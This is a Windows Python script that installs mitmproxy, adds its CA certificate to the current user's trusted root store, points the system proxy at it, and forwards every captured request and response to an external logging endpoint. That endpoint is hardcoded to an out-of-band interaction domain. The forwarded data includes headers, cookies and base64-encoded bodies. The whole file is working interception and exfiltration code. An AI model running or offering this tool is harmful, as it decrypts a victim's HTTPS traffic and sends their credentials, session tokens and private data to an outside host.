# mitm_forward_currentuser.pyw
# Single-file helper:
# - ensures mitmdump (mitmproxy) exists (pip-installs if needed),
# - starts mitmdump with a small addon that POSTs captured request+response JSON to your LOG_ENDPOINT,
# - ensures mitmproxy CA exists and installs it into CurrentUser Trusted Root (no admin in most cases),
# - flips Windows system proxy to point to the local mitmproxy, and restores + removes CA on exit.
#
# Usage: double-click the .pyw (requires Python 3.x installed). Internet required to pip-install mitmproxy if missing.
#
# LOG_ENDPOINT is your domain endpoint to receive JSON captures.

import os, sys, subprocess, time, shutil, tempfile, json, base64, threading, ctypes
from pathlib import Path

# ------------------- Config -------------------
LOG_ENDPOINT = "https://adaeblamolxntdjzwsuedl8ntju04fblb.oast.fun/log"
MITM_PORT = 8888                       # local mitmproxy listen port (change if you want)
MITMDUMP_CMD = "mitmdump"              # command (mitmdump is headless mitmproxy)
CHECK_INSTALL_TIMEOUT = 600            # seconds to wait for mitm CA to appear
MAX_RESPONSE_CAPTURE = 1024*1024       # cap response body sent in bytes (1 MB)
# ----------------------------------------------

def msg_box(msg, title="mitm_forward", flags=0):
    try:
        ctypes.windll.user32.MessageBoxW(0, str(msg), str(title), flags)
    except Exception:
        pass

def ensure_mitmdump():
    """Ensure mitmdump is available. If not, pip install mitmproxy (may take time)."""
    try:
        # check existing in PATH
        proc = subprocess.run([MITMDUMP_CMD, "--version"], capture_output=True, text=True)
        if proc.returncode == 0:
            return True
    except FileNotFoundError:
        pass
    # attempt pip install
    msg_box("mitmdump not found. Will attempt 'pip install mitmproxy' now. This requires internet and may take several minutes.", "Installing mitmproxy")
    try:
        # prefer same Python executable used to run this script
        python_exec = sys.executable or "python"
        proc = subprocess.run([python_exec, "-m", "pip", "install", "--upgrade", "pip"], capture_output=True, text=True, timeout=600)
        proc = subprocess.run([python_exec, "-m", "pip", "install", "mitmproxy"], capture_output=True, text=True, timeout=1800)
        # re-check
        proc = subprocess.run([MITMDUMP_CMD, "--version"], capture_output=True, text=True)
        if proc.returncode == 0:
            return True
        else:
            msg_box("Failed to verify mitmdump after installation.\n\npip output:\n" + (proc.stdout or proc.stderr), "Error")
            return False
    except Exception as e:
        msg_box(f"Failed installing mitmproxy: {e}", "Error")
        return False

def write_addon(tempdir, log_endpoint):
    """Write a mitmproxy addon script that posts request+response JSON to log_endpoint."""
    addon_path = Path(tempdir) / "forward_addon.py"
    addon_code = f'''
from mitmproxy import http
import urllib.request, json, base64, threading, time

LOG_ENDPOINT = {json.dumps(log_endpoint)}
MAX_RESP = {MAX_RESPONSE_CAPTURE}

def _post(payload):
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(LOG_ENDPOINT, data=data, headers={{"Content-Type":"application/json"}})
    try:
        urllib.request.urlopen(req, timeout=12)
    except Exception:
        pass

def _mk_payload(flow):
    try:
        req_body = flow.request.raw_content or b""
    except Exception:
        req_body = b""
    try:
        resp_body = flow.response.raw_content or b""
    except Exception:
        resp_body = b""
    if resp_body and len(resp_body) > MAX_RESP:
        resp_body_sent = base64.b64encode(resp_body[:MAX_RESP]).decode('ascii')
        resp_truncated = True
    else:
        resp_body_sent = base64.b64encode(resp_body).decode('ascii') if resp_body else ""
        resp_truncated = False
    payload = {{
        "timestamp": time.time(),
        "client_ip": flow.client_conn.peername[0] if flow.client_conn and hasattr(flow.client_conn, 'peername') else "",
        "method": flow.request.method,
        "scheme": flow.request.scheme,
        "host": flow.request.host,
        "path": flow.request.path,
        "url": flow.request.pretty_url,
        "request_headers": dict(flow.request.headers),
        "request_body_b64": base64.b64encode(req_body).decode('ascii') if req_body else "",
        "response_status_code": flow.response.status_code if flow.response else None,
        "response_headers": dict(flow.response.headers) if flow.response else {{}},
        "response_body_b64": resp_body_sent,
        "response_truncated": resp_truncated
    }}
    return payload

def response(flow: http.HTTPFlow):
    try:
        payload = _mk_payload(flow)
        threading.Thread(target=_post, args=(payload,), daemon=True).start()
    except Exception:
        pass
'''
    addon_path.write_text(addon_code, encoding="utf-8")
    return str(addon_path)

def ensure_mitm_ca_generated(tempdir, timeout=CHECK_INSTALL_TIMEOUT):
    """Start mitmdump briefly to force CA creation, then stop it; wait for CA file in ~/.mitmproxy."""
    home = Path.home()
    mitm_dir = home / ".mitmproxy"
    # start mitmdump in a short-lived mode to ensure it has generated CA files
    try:
        p = subprocess.Popen([MITMDUMP_CMD, "--listen-port", str(MITM_PORT)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        return False, "unable to start mitmdump for CA generation"
    # wait a few seconds for it to create files
    time.sleep(3)
    # terminate
    try:
        p.terminate()
    except Exception:
        try:
            p.kill()
        except Exception:
            pass
    # wait for CA file
    deadline = time.time() + timeout
    found = None
    while time.time() < deadline:
        if mitm_dir.exists() and mitm_dir.is_dir():
            for name in ("mitmproxy-ca.pem", "mitmproxy-ca-cert.pem", "mitmproxy-ca-cert.p12", "mitmproxy-ca.pem"):
                candidate = mitm_dir / name
                if candidate.exists():
                    found = candidate
                    break
            # fallback: any pem file with 'mitmproxy' in name
            if not found:
                for candidate in mitm_dir.glob("*mitm*pem"):
                    if candidate.exists():
                        found = candidate
                        break
        if found:
            return True, str(found)
        time.sleep(1)
    return False, "timed out waiting for mitm CA file in ~/.mitmproxy"

def install_cert_user(cert_path):
    """Install certificate into CurrentUser\Root using certutil -user -addstore Root <cert>"""
    try:
        proc = subprocess.run(["certutil", "-user", "-addstore", "Root", cert_path], capture_output=True, text=True, timeout=30)
        ok = proc.returncode == 0
        return ok, proc.stdout + proc.stderr
    except Exception as e:
        return False, str(e)

def remove_cert_user_by_subject(subject):
    """Remove a cert by subject from CurrentUser\Root"""
    try:
        proc = subprocess.run(["certutil", "-user", "-delstore", "Root", subject], capture_output=True, text=True, timeout=30)
        return proc.returncode == 0, proc.stdout + proc.stderr
    except Exception as e:
        return False, str(e)

def set_windows_user_proxy(proxy_addr):
    """Set HKCU proxy values via reg add (no admin)."""
    try:
        subprocess.run(["reg", "add", r"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "/v", "ProxyEnable", "/t", "REG_DWORD", "/d", "1", "/f"], check=True)
        subprocess.run(["reg", "add", r"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "/v", "ProxyServer", "/t", "REG_SZ", "/d", proxy_addr, "/f"], check=True)
        subprocess.run(["reg", "add", r"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "/v", "ProxyOverride", "/t", "REG_SZ", "/d", "<local>", "/f"], check=True)
        # notify windows
        try:
            import ctypes
            INTERNET_OPTION_SETTINGS_CHANGED = 39
            INTERNET_OPTION_REFRESH = 37
            ctypes.windll.Wininet.InternetSetOptionW(0, INTERNET_OPTION_SETTINGS_CHANGED, 0, 0)
            ctypes.windll.Wininet.InternetSetOptionW(0, INTERNET_OPTION_REFRESH, 0, 0)
        except Exception:
            pass
        return True, ""
    except Exception as e:
        return False, str(e)

def clear_windows_user_proxy():
    try:
        subprocess.run(["reg", "add", r"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "/v", "ProxyEnable", "/t", "REG_DWORD", "/d", "0", "/f"], check=True)
        subprocess.run(["reg", "delete", r"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "/v", "ProxyServer", "/f"], check=True)
        subprocess.run(["reg", "delete", r"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "/v", "ProxyOverride", "/f"], check=True)
        try:
            import ctypes
            INTERNET_OPTION_SETTINGS_CHANGED = 39
            INTERNET_OPTION_REFRESH = 37
            ctypes.windll.Wininet.InternetSetOptionW(0, INTERNET_OPTION_SETTINGS_CHANGED, 0, 0)
            ctypes.windll.Wininet.InternetSetOptionW(0, INTERNET_OPTION_REFRESH, 0, 0)
        except Exception:
            pass
        return True, ""
    except Exception as e:
        return False, str(e)

def find_cert_subject(cert_path):
    """Return certificate subject CN using openssl if available, else try certutil -dump."""
    # try openssl
    try:
        proc = subprocess.run(["openssl", "x509", "-noout", "-subject", "-in", cert_path], capture_output=True, text=True, timeout=10)
        if proc.returncode == 0:
            out = proc.stdout.strip()
            # out like: subject= /CN=Mitmproxy CA
            if "subject=" in out:
                subj = out.split("subject=")[1].strip()
                # prefer full subject or CN only
                # return subj as-is (certutil -delstore expects a subject string; often "mitmproxy")
                # We'll try to extract CN value if present
                if "CN=" in subj:
                    parts = subj.split("CN=")
                    cn = parts[1].split("/")[0].strip()
                    return cn
                return subj
    except Exception:
        pass
    # fallback: try certutil -dump
    try:
        proc = subprocess.run(["certutil", "-dump", cert_path], capture_output=True, text=True, timeout=10)
        out = proc.stdout + proc.stderr
        # naive parse
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("Subject:"):
                subj = line.split("Subject:",1)[1].strip()
                if "CN=" in subj:
                    parts = subj.split("CN=")
                    cn = parts[1].split(",")[0].strip()
                    return cn
                return subj
    except Exception:
        pass
    return None

def main():
    tmpdir = tempfile.mkdtemp(prefix="mitm_tmp_")
    addon_path = None
    mitmdump_proc = None
    installed_subject = None
    try:
        ok = ensure_mitmdump()
        if not ok:
            msg_box("mitmdump (mitmproxy) not available and automatic install failed. Please install mitmproxy before running this script.", "Error")
            return

        addon_path = write_addon(tmpdir, LOG_ENDPOINT)

        # ensure mitm CA exists (start & stop mitmdump to create it if needed)
        got, info = ensure_mitm_ca_generated(tmpdir, timeout=60)
        if not got:
            msg_box("Failed to generate or locate mitmproxy CA: " + str(info), "Error")
            return
        ca_path = info

        # find a friendly subject name from the CA to be able to remove it later
        subject_cn = find_cert_subject(ca_path) or "mitmproxy"
        installed_subject = subject_cn

        # install CA into CurrentUser Root
        ok, out = install_cert_user(ca_path)
        if not ok:
            msg_box("Failed to install mitmproxy CA into CurrentUser store.\n\nOutput:\n" + str(out), "Error")
            # continue but warn - without install HTTPS will show cert errors
            # allow user to continue manually if they want
        else:
            msg_box(f"Installed mitmproxy CA into CurrentUser Trusted Root as: {installed_subject}", "Installed CA")

        # start mitmdump with addon
        mitmdump_cmd = [MITMDUMP_CMD, "-p", str(MITM_PORT), "-s", addon_path]
        mitmdump_proc = subprocess.Popen(mitmdump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # short wait to let mitmproxy start
        time.sleep(2)

        # set system proxy to local mitmproxy
        ok, out = set_windows_user_proxy(f"127.0.0.1:{MITM_PORT}")
        if not ok:
            msg_box("Failed to set Windows system proxy:\n" + str(out), "Error")
        else:
            msg_box(f"mitmproxy started on 127.0.0.1:{MITM_PORT} and system proxy set.\nBrowse now; captured requests will be forwarded to your LOG_ENDPOINT.", "Started")

        # keep running until process stops or user kills script
        while True:
            time.sleep(1)
            if mitmdump_proc and mitmdump_proc.poll() is not None:
                break

    except KeyboardInterrupt:
        pass
    except Exception as e:
        msg_box("Unexpected error: " + str(e), "Error")
    finally:
        # attempt graceful shutdown & cleanup
        try:
            if mitmdump_proc and mitmdump_proc.poll() is None:
                mitmdump_proc.terminate()
                # wait a second
                time.sleep(1)
                if mitmdump_proc.poll() is None:
                    mitmdump_proc.kill()
        except Exception:
            pass
        try:
            clear_windows_user_proxy()
        except Exception:
            pass
        # try to remove CA we installed
        if installed_subject:
            try:
                ok, out = remove_cert_user_by_subject(installed_subject)
                # ignore result; if removal fails, user can remove manually
            except Exception:
                pass
        # cleanup temp files
        try:
            shutil.rmtree(tmpdir)
        except Exception:
            pass
        msg_box("Stopped mitm_forward. System proxy restored (if changed). If CA removal failed, remove it manually via certutil -user -delstore Root \"{0}\"".format(installed_subject or "mitmproxy"), "Stopped")

if __name__ == "__main__":
    main()
